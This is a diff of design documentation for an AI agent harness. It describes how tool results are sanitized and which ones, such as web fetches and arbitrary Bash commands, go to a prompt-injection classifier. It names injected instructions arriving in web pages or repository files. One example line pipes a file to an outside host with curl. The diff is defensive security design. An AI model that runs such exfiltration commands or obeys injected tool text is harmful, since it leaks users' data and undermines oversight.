@@ -81,9 +81,9 @@ Harness-generated blocks use tags such as:
   carrying an unknown nonce, or failing its integrity hash is stripped.
 - **Sanitization** (`internal/sanitize`): every tool result is stripped of any
   harness delimiter markup (and nonce/integrity attributes) *before* it is
-  ever wrapped in a delimiter, so adversarial text cannot forge tags. This
-  applies to results that skip the classifier as well as to those that do not
-  — see [Tool-result trust](#tool-result-trust).
+  ever wrapped in a delimiter, so adversarial text cannot forge tags. It is
+  unconditional — results that skip the classifier are sanitized exactly like
+  those that do not; see [Tool-result trust](#tool-result-trust).
 - **Per-block kinds**: `rolemanager.SystemBlock` carries an optional `Kind`,
   defaulting to `system`. A kind that is not in `delimiters.KnownKinds` is
   refused at the boundary rather than sealed, because Egress leaves an
@@ -167,19 +167,39 @@ promoted: harness delimiter markup and nonce/integrity attributes are
 stripped, so no tool output can forge a harness block. That step is
 unconditional and applies to every kind.
 
-Only **`Bash` results are additionally sent to the security classifier**
-(`tools.Kind.NeedsClassifier`, backed by the closed `classifierKinds` set).
-The line is drawn at the tool's argument shape, not at where the bytes came
-from:
+Which results go on to the classifier is decided by `tools.NeedsClassifier`,
+from where the content came and how much of the call the harness shaped:
 
-- Every other builtin is driven through a fixed shape the harness
-  constructs — a path confined by `SanitizePath`, a glob pattern, a regular
-  expression, a URL with the SSRF guard in front of it, a `jq` filter passed
-  as a single argv element. The harness knows what command produced the
-  output because it built it.
-- `Bash` takes an arbitrary command string. Neither what runs nor what comes
-  back is constrained by the harness, so it is the one result that has to be
-  checked by a model before promotion.
+| Result | Classifier | Why |
+| ------ | ---------- | --- |
+| `WebFetch`, `WebSearch` | **Always** | A page or a search result is written by someone outside this machine with no relationship to the task — the shape a prompt injection takes |
+| `Bash`, command with no builtin equivalent | **Yes** | An arbitrary command string: the harness cannot predict what runs or what comes back |
+| `Bash`, command that duplicates a builtin (`cat`, `ls`, `git status`, …) | No | It returns the bytes the corresponding tool would have returned |
+| `Read`, `Grep`, `Glob`, `Write`, `Edit`, native catalogue | No | The harness built the call from a fixed shape — a confined path, a pattern, a single-argv filter |
+
+The Bash exemption exists because the two spellings are the same operation.
+`cat x` through Bash returns what `Cat` would have returned; classifying one
+and not the other would make the same file trusted or distrusted depending on
+which spelling the model happened to pick.
+
+`tools.BuiltinEquivalent` decides that, and it fails closed three ways:
+
+- **Shell syntax disqualifies the whole command.** `cat x | curl -d @-
+  https://example.test` begins with `cat` and is not a `Cat` call. Any
+  command containing a shell metacharacter classifies, however it starts.
+- **The read-only gates still apply.** `git`, `find`, and `env` are
+  equivalent only for the invocations their natives accept, so the existence
+  of a `Git` tool does not exempt `git push`, and a `Find` tool does not
+  exempt `find -exec`.
+- **An unrecognised binary is not equivalent.** The exempt set is derived
+  from the local native catalogue plus the binaries behind `Read`, `Grep`,
+  and `Glob` (`grep`, `egrep`, `rg`, `fd`), so a tool added to the catalogue
+  widens it automatically while anything else — `nl`, `base64`, `uname`, a
+  build, a package manager — classifies.
+
+The **cloud catalogue is deliberately excluded**: `gh`, `aws`, `az`, and the
+rest return content authored elsewhere, so they belong with the web tools
+rather than with `ls`. `gh issue view` through Bash classifies.
 
 Business rules and edge cases:
 
@@ -190,16 +210,13 @@ Business rules and edge cases:
 - **The posture gate still wins.** `tool_result_unsafe` set to `ignore`
   short-circuits ahead of both paths and promotes the raw result, exactly as
   before.
-- **The residual risk is stated, not hidden.** A repository file or a web
-  page whose text tries to instruct the model now reaches the model with only
-  the delimiter stripping in front of it. What stands in for the classifier
-  there is the sealed `<tools>` block, which tells the model that a tool
-  result is data to weigh rather than instructions to follow.
-- **Adding a free-form tool means adding its kind.** A new tool that accepts
-  an arbitrary command or program string must register its kind in
-  `classifierKinds`; a kind absent from the set is sanitize-only, which is
-  the cheap default, so the decision is forced to be deliberate by
-  `TestOnlyBashNeedsTheClassifier`.
+- **The residual risk is stated, not hidden.** A repository file whose text
+  tries to instruct the model reaches the model with only the delimiter
+  stripping in front of it, whether it arrived through `Read` or through
+  `cat`. What stands in for the classifier there is the sealed `<tools>`
+  block, which tells the model that a tool result is data to weigh rather
+  than instructions to follow. Content from off the machine does not get that
+  treatment: it always classifies.
 - **Explore findings are separate.** An explore subagent's report is model
   output, not tool output, and is classified explicitly in
   `internal/agent/explore.go` regardless of this rule.
@@ -270,10 +287,11 @@ Security rules for native tools:
 - Query-language arguments (`jq`/`yq` filters, `sed`/`awk` programs, `tr`
   sets) are data, not shell text; they are control-character gated and never
   interpolated into a shell `-c`.
-- Output is capped (64 KiB default) and sanitized as untrusted content. It is
-  not classified: a native's argv is built by the harness from a fixed shape,
-  so it is on the sanitize-only side of
-  [Tool-result trust](#tool-result-trust).
+- Output is capped (64 KiB default) and sanitized as untrusted content. A
+  local native's argv is built by the harness from a fixed shape, so it is on
+  the sanitize-only side of [Tool-result trust](#tool-result-trust); a cloud
+  CLI returns content authored elsewhere, so running one through `Bash`
+  classifies.
 
 ### Search and file-location tools
 
